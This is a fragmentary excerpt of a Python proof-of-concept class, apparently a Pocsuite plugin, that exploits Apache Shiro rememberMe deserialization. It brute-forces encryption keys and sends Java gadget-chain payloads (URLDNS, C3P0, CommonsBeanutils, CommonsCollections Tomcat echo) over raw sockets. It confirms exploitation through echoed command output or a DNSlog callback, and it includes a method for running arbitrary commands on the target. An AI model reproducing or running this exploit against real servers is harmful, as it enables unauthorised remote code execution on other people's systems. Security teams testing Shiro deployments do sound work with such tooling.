...
class Shiro_key_detect_with_echo(POCBase):
    ...
    updateDate = '2021-04-16'  # PoC 更新的时间,默认和编写时间一样
    ...
    # 第二级别：未发现漏洞，只是找到了key
    def _verify(self, p_cmd='echo {0}'.format(BANNER)):
        result={}
        ...
        default_cmd = 'echo {0}'.format(self.BANNER)
        cmd = p_cmd
            ...
            for key in key_list:
                ...
                if flag in str(hello) and flag not in str(hello2):
                    ...
                    if cmd == default_cmd:
                        ...
                        res_URLDNS            = self.test_vuln_with_key(host, port, path, key, __bb_URLDNS, 'URLDNS')
    
                        logger.info("尝试C3P0: {0}".format(c3p0_host))


                        res_C3P0              = self.test_echo_with_key(host, port, path, key, __bb_C3P0, 'C3P0')
                        logger.info("尝试CommonsBeanutils1_tomcat")
                        res_CB1_tomcat_cmd = self.test_echo_with_key(host, port, path, key, __bb_CommonsBeanutils1_tomcat_echo, 'CommonsBeanutils1_tomcat')
                        logger.info("尝试CommonsCollectionsK1TomcatEcho")
                        res_CCK1_tomcat = self.test_echo_with_key(host, port, path, key, __bb, 'CommonsCollectionsK1TomcatEcho')
                        logger.info("CommonsCollectionsK2TomcatEcho")
                        res_CCK2_tomcat = self.test_echo_with_key(host, port, path, key, __bb2, 'CommonsCollectionsK2TomcatEcho')
    
                        #logger.info("尝试CommonsCollections10TomcatEcho")
                        #res_CC10_tomcat = self.test_echo_with_key(host, port, path, key, __bb_CC10_tomcat_echo, 'CommonsCollections10TomcatEcho')
                    else:
    ...
    # 带回显的漏洞检测
    def test_echo_with_key(self, p_host, p_port, p_path, p_key, p_bb, p_gadget):
        sock = self.init_socket(p_host, p_port)
        
        _ciphertext = self.generate_ciphertext(p_key, p_bb).decode('utf-8')
        
        # 发送带有self.BANNER的请求
        payload = self.format_payload_echo(p_host, p_port, self.BANNER, _ciphertext, p_path)    #TODO
        ...
        #logger.info(hello)
        # 若响应中存在self.BANNER，则表示已成功回显，存在漏洞
        if self.BANNER in str(hello):
            result = {}
            result['VerifyInfo'] = {}
    ...
    # 带回显的命令执行
    def test_echo_with_key_with_cmd(self, p_host, p_port, p_path, p_key, p_bb, p_gadget, p_cmd='echo {0}'.format(BANNER)):
        sock = self.init_socket(p_host, p_port)
    ...
    # 不带回显（使用dnslog）的漏洞检测
    def test_vuln_with_key(self, p_host, p_port, p_path, p_key, p_bb, p_gadget):
        sock = self.init_socket(p_host, p_port)
        ...
        if self.test_dnslog(self.CEYE_URL_DNS):
            result = {}
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = "存在Shiro反序列化漏洞"
            result['VerifyInfo']['Path'] = p_path
            result['VerifyInfo']['Key'] = p_key
            result['VerifyInfo']['DNSlog'] = "{0}.urldns.{1}".format(self.BANNER, self.DOMAIN)
            result['VerifyInfo']['Gadget'] = p_gadget
            result['VerifyInfo']['Payload'] = payload
            result['VerifyInfo']['Response'] = hello.decode('utf-8')
